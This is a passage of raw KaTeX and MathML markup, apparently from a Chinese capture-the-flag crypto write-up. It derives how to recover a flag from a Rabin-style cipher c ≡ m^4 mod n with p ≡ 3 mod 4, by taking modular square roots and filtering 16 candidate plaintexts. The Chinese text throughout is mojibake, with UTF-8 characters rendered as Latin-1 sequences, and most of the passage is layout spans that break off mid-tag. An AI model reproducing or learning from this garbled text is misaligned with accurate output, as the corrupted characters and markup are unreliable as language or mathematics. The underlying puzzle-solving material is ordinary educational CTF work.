display="block"><semantics><mrow><mi>c</mi><mo>â‰¡</mo><msup><mi>m</mi><mn>4</mn></msup><mo>â‰¡</mo><msup><mi>x</mi><mn>2</mn></msup><mspace></mspace><mspace width="1em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext>â€‰</mtext><mtext>â€‰</mtext><mi>n</mi><mspace linebreak="newline"></mspace><mi>c</mi><mo>â‰¡</mo><msup><mi>m</mi><mn>4</mn></msup><mo>â‰¡</mo><msup><mi>x</mi><mn>2</mn></msup><mspace></mspace><mspace width="1em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext>â€‰</mtext><mtext>â€‰</mtext><mi>p</mi><mspace width="1em"/><mtext>è¯´æ˜</mtext><mi>c</mi><mtext>æ˜¯æ¨¡</mtext><mi>p</mi><mtext>ä¸‹çš„äºŒæ¬¡å‰©ä½™</mtext><mspace linebreak="newline"></mspace><mtext>å¯å¾—è¿™æ¡ç»“è®º</mtext><msup><mi>c</mi><mfrac><mrow><mi>p</mi><mo>âˆ’</mo><mn>1</mn></mrow><mn>2</mn></mfrac></msup><mo>â‰¡</mo><mn>1</mn><mspace></mspace><mspace width="1em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext>â€‰</mtext><mtext>â€‰</mtext><mi>p</mi><mspace linebreak="newline"></mspace><mtext>ï¼ˆè¯¦ç»†è¯æ˜çœ‹ä¸Šé¢</mtext><mi>N</mi><mi>S</mi><mi>S</mi><mi>C</mi><mi>T</mi><mi>F</mi><mtext>ä¸­</mtext><mi>x</mi><mi>e</mi><mi>n</mi><mi>n</mi><mi>y</mi><mtext>å¸ˆå‚…çš„æ–‡ç« ï¼‰</mtext><mspace linebreak="newline"></mspace><msup><mi>x</mi><mn>2</mn></msup><mo>â‰¡</mo><mi>c</mi><mo>â‰¡</mo><msup><mi>c</mi><mfrac><mrow><mi>p</mi><mo>âˆ’</mo><mn>1</mn></mrow><mn>2</mn></mfrac></msup><mo>âˆ—</mo><mi>c</mi><mo>â‰¡</mo><msup><mi>c</mi><mfrac><mrow><mi>p</mi><mo>+</mo><mn>1</mn></mrow><mn>2</mn></mfrac></msup><mspace></mspace><mspace width="1em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext>â€‰</mtext><mtext>â€‰</mtext><mi>p</mi><mspace linebreak="newline"></mspace><mtext>ç”±æ¡ä»¶</mtext><mi>p</mi><mo>â‰¡</mo><mn>3</mn><mspace></mspace><mspace width="1em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext>â€‰</mtext><mtext>â€‰</mtext><mn>4</mn><mtext>ï¼Œå¯çŸ¥</mtext><msup><mi>c</mi><mfrac><mrow><mi>p</mi><mo>+</mo><mn>1</mn></mrow><mn>2</mn></mfrac></msup><mtext>å¯ä»¥è¿›è¡Œå¼€æ–¹</mtext><mspace linebreak="newline"></mspace><mtext>å¾—ï¼š</mtext><msub><mi>x</mi><mn>1</mn></msub><mo>â‰¡</mo><msup><mi>c</mi><mfrac><mrow><mi>p</mi><mo>+</mo><mn>1</mn></mrow><mn>4</mn></mfrac></msup><mspace></mspace><mspace width="1em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext>â€‰</mtext><mtext>â€‰</mtext><mi>p</mi><mtext>å’Œ</mtext><msub><mi>x</mi><mn>2</mn></msub><mo>â‰¡</mo><mo stretchy="false">(</mo><mi>p</mi><mo>âˆ’</mo><msup><mi>c</mi><mfrac><mrow><mi>p</mi><mo>+</mo><mn>1</mn></mrow><mn>4</mn></mfrac></msup><mo stretchy="false">)</mo><mspace></mspace><mspace width="1em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext>â€‰</mtext><mtext>â€‰</mtext><mi>p</mi><mspace linebreak="newline"></mspace><mtext>åŒç†å¾—ï¼š</mtext><msub><mi>x</mi><mn>3</mn></msub><mo>â‰¡</mo><msup><mi>c</mi><mfrac><mrow><mi>q</mi><mo>+</mo><mn>1</mn></mrow><mn>4</mn></mfrac></msup><mspace></mspace><mspace width="1em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext>â€‰</mtext><mtext>â€‰</mtext><mi>q</mi><mtext>å’Œ</mtext><msub><mi>x</mi><mn>4</mn></msub><mo>â‰¡</mo><mo stretchy="false">(</mo><mi>q</mi><mo>âˆ’</mo><msup><mi>c</mi><mfrac><mrow><mi>q</mi><mo>+</mo><mn>1</mn></mrow><mn>4</mn></mfrac></msup><mo stretchy="false">)</mo><mspace></mspace><mspace width="1em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext>â€‰</mtext><mtext>â€‰</mtext><mi>q</mi><mspace linebreak="newline"></mspace><mtext>ä¹‹åå¯¹</mtext><msub><mi>x</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>x</mi><mn>2</mn></msub><mo separator="true">,</mo><msub><mi>x</mi><mn>3</mn></msub><mo separator="true">,</mo><msub><mi>x</mi><mn>4</mn></msub><mtext>éƒ½å†è¿›è¡Œä¸€æ¬¡</mtext><mi>r</mi><mi>a</mi><mi>b</mi><mi>i</mi><mi>n</mi><mtext>å°±å¯ä»¥å¾—åˆ°</mtext><mn>16</mn><mtext>ä¸ª</mtext><msub><mi>m</mi><mi>i</mi></msub><mspace linebreak="newline"></mspace><mtext>è¿›è¡Œç­›é€‰å¯å¾—æœ€ç»ˆ</mtext><mi>f</mi><mi>l</mi><mi>a</mi><mi>g</mi></mrow><annotation encoding="application/x-tex">c\equiv m^4\equiv x^2\mod n\\c\equiv m^4\equiv x^2\mod p\quadè¯´æ˜cæ˜¯æ¨¡pä¸‹çš„äºŒæ¬¡å‰©ä½™\\å¯å¾—è¿™æ¡ç»“è®ºc^{\frac{p-1}{2}}\equiv 1\mod p\\ï¼ˆè¯¦ç»†è¯æ˜çœ‹ä¸Šé¢NSSCTFä¸­xennyå¸ˆå‚…çš„æ–‡ç« ï¼‰\\x^2\equiv c\equiv c^{\frac{p-1}{2}}*c\equiv c^{\frac{p+1}{2}}\mod p\\ç”±æ¡ä»¶p\equiv3\mod4ï¼Œå¯çŸ¥c^{\frac{p+1}{2}}å¯ä»¥è¿›è¡Œå¼€æ–¹\\å¾—ï¼šx_1\equiv c^{\frac{p+1}{4}}\mod på’Œx_2\equiv(p-c^{\frac{p+1}{4}})\mod p\\åŒç†å¾—ï¼šx_3\equiv c^{\frac{q+1}{4}}\mod qå’Œx_4\equiv(q-c^{\frac{q+1}{4}})\mod q\\ä¹‹åå¯¹x_1,x_2,x_3,x_4éƒ½å†è¿›è¡Œä¸€æ¬¡rabinå°±å¯ä»¥å¾—åˆ°16ä¸ªm_i\\è¿›è¡Œç­›é€‰å¯å¾—æœ€ç»ˆflag</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.46375em;vertical-align:0em;"></span><span class="mord mathnormal">c</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">â‰¡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8641079999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">4</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">â‰¡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8641079999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:1em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">m</span><span class="mord mathrm">o</span><span class="mord mathrm">d</span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">n</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.46375em;vertical-align:0em;"></span><span class="mord mathnormal">c</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">â‰¡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8641079999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">4</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">â‰¡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8641079999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:1em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">m</span><span class="mord mathrm">o</span><span class="mord mathrm">d</span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:1em;"></span><span class="mord cjk_fallback">è¯´</span><span class="mord cjk_fallback">æ˜</span><span class="mord mathnormal">c</span><span class="mord cjk_fallback">æ˜¯</span><span class="mord cjk_fallback">æ¨¡</span><span class="mord mathnormal">p</span><span class="mord cjk_fallback">ä¸‹</span><span class="mord cjk_fallback">çš„</span><span class="mord cjk_fallback">äºŒ</span><span class="mord cjk_fallback">æ¬¡</span><span class="mord cjk_fallback">å‰©</span><span class="mord cjk_fallback">ä½™</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:1.0588899999999999em;vertical-align:0em;"></span><span class="mord cjk_fallback">å¯</span><span class="mord cjk_fallback">å¾—</span><span class="mord cjk_fallback">è¿™</span><span class="mord cjk_fallback">æ¡</span><span class="mord cjk_fallback">ç»“</span><span class="mord cjk_fallback">è®º</span><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:1.0588899999999999em;"><span style="top:-3.4130000000000003em;margin-right:0.05em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mopen nulldelimiter sizing reset-size3 size6"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.9227em;"><span style="top:-2.656em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span><span style="top:-3.2255000000000003em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line mtight" style="border-bottom-width:0.049em;"></span></span><span style="top:-3.4623857142857144em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">p</span><span class="mbin mtight">âˆ’</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.344em;"><span></span></span></span></span></span><span class="mclose nulldelimiter sizing reset-size3 size6"></span></span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">â‰¡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:1em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">m</span><span class="mord mathrm">o</span><span class="mord mathrm">d</span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">p</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.8777699999999999em;vertical-align:-0.19444em;"></span><span class="mord cjk_fallback">ï¼ˆ</span><span class="mord cjk_fallback">è¯¦</span><span class="mord cjk_fallback">ç»†</span><span class="mord cjk_fallback">è¯</span><span class="mord cjk_fallback">æ˜</span><span class="mord cjk_fallback">çœ‹</span><span class="mord cjk_fallback">ä¸Š</span><span class="mord cjk_fallback">é¢</span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mord cjk_fallback">ä¸­</span><span class="mord mathnormal">x</span><span class="mord mathnormal">e</span><span class="mord mathnormal">n</span><span class="mord mathnormal">n</span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mord cjk_fallback">å¸ˆ</span><span class="mord cjk_fallback">å‚…</span><span class="mord cjk_fallback">çš„</span><span class="mord cjk_fallback">æ–‡</span><span class="mord cjk_fallback">ç« </span><span class="mord cjk_fallback">ï¼‰</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.8641079999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">â‰¡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.46375em;vertical-align:0em;"></span><span class="mord mathnormal">c</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">â‰¡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.0588899999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:1.0588899999999999em;"><span style="top:-3.4130000000000003em;margin-right:0.05em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mopen nulldelimiter sizing reset-size3 size6"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.9227em;"><span style="top:-2.656em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span><span style="top:-3.2255000000000003em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line mtight" style="border-bottom-width:0.049em;"></span></span><span style="top:-3.4623857142857144em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">p</span><span class="mbin mtight">âˆ’</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.344em;"><span></span></span></span></span></span><span class="mclose nulldelimiter sizing reset-size3 size6"></span></span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">âˆ—</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.46375em;vertical-align:0em;"></span><span class="mord mathnormal">c</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">â‰¡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.0588899999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:1.0588899999999999em;"><span style="top:-3.4130000000000003em;margin-right:0.05em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mopen nulldelimiter sizing reset-size3 size6"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.9227em;"><span style="top:-2.656em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span><span style="top:-3.2255000000000003em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line mtight" style="border-bottom-width:0.049em;"></span></span><span style="top:-3.4623857142857144em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">p</span><span class="mbin mtight">+</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.344em;"><span></span></span></span></span></span><span class="mclose nulldelimiter sizing reset-size3 size6"></span></span></span></span></span></span></span></span></span></span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:1em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">m</span><span class="mord mathrm">o</span><span class="mord mathrm">d</span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">p</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.8777699999999999em;vertical-align:-0.19444em;"></span><span class="mord cjk_fallback">ç”±</span><span class="mord cjk_fallback">æ¡</span><span class="mord cjk_fallback">ä»¶</span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">â‰¡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">3</span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:1em;"></span></span><span class="base"><span class="strut" style="height:1.0588899999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">m</span><span class="mord mathrm">o</span><span class="mord mathrm">d</span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">4</span><span class="mord cjk_fallback">ï¼Œ</span><span class="mord cjk_fallback">å¯</span><span class="mord cjk_fallback">çŸ¥</span><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:1.0588899999999999em;"><span style="top:-3.4130000000000003em;margin-right:0.05em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mopen nulldelimiter sizing reset-size3 size6"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.9227em;"><span style="top:-2.656em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span><span style="top:-3.2255000000000003em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line mtight" style="border-bottom-width:0.049em;"></span></span><span style="top:-3.4623857142857144em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">p</span><span class="mbin mtight">+</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.344em;"><span></span></span></span></span></span><span class="mclose nulldelimiter sizing reset-size3 size6"></span></span></span></span></span></span></span></span></span></span><span class="mord cjk_fallback">å¯</span><span class="mord cjk_fallback">ä»¥</span><span class="mord cjk_fallback">è¿›</span><span class="mord cjk_fallback">è¡Œ</span><span class="mord cjk_fallback">å¼€</span><span class="mord cjk_fallback">æ–¹</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord cjk_fallback">å¾—</span><span class="mord cjk_fallback">ï¼š</span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">â‰¡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.0588899999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:1.0588899999999999em;"><span style="top:-3.4130000000000003em;margin-right:0.05em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mopen nulldelimiter sizing reset-size3 size6"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.9227em;"><span style="top:-2.656em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">4</span></span></span></span><span style="top:-3.2255000000000003em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line mtight" style="border-bottom-width:0.049em;"></span></span><span style="top:-3.4623857142857144em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">p</span><span class="mbin mtight">+</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.344em;"><span></span></span></span></span></span><span class="mclose nulldelimiter sizing reset-size3 size6"></span></span></span></span></span></span></span></span></span></span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:1em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">m</span><span class="mord mathrm">o</span><span class="mord mathrm">d</span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">p</span><span class="mord cjk_fallback">å’Œ</span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">â‰¡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">âˆ’</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.3088899999999999em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:1.0588899999999999em;"><span style="top:-3.4130000000000003em;margin-right:0.05em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mopen nulldelimiter sizing reset-size3 size6"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.9227em;"><span style="top:-2.656em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">4</span></span></span></span><span style="top:-3.2255000000000003em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line mtight" style="border-bottom-width:0.049em;"></span></span><span style="top:-3.4623857142857144em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">p</span><span class="mbin mtight">+</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.344em;"><span></span></span></span></span></span><span class="mclose nulldelimiter sizing reset-size3 size6"></span></span></span></span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:1em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">m</span><span class="mord mathrm">o</span><span class="mord mathrm">d</span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">p</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord cjk_fallback">åŒ</span><span class="mord cjk_fallback">ç†</span><span class="mord cjk_fallback">å¾—</span><span class="mord cjk_fallback">ï¼š</span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">â‰¡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.0588899999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:1.0588899999999999em;"><span style="top:-3.4130000000000003em;margin-right:0.05em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mopen nulldelimiter sizing reset-size3 size6"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.9227em;"><span style="top:-2.656em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">4</span></span></span></span><span style="top:-3.2255000000000003em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line mtight" style="border-bottom-width:0.049em;"></span></span><span style="top:-3.4623857142857144em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">q</span><span class="mbin mtight">+</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.344em;"><span></span></span></span></span></span><span class="mclose nulldelimiter sizing reset-size3 size6"></span></span></span></span></span></span></span></span></span></span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:1em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">m</span><span class="mord mathrm">o</span><span class="mord mathrm">d</span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mord cjk_fallback">å’Œ</span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">4</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">â‰¡</span><span class="mspace" 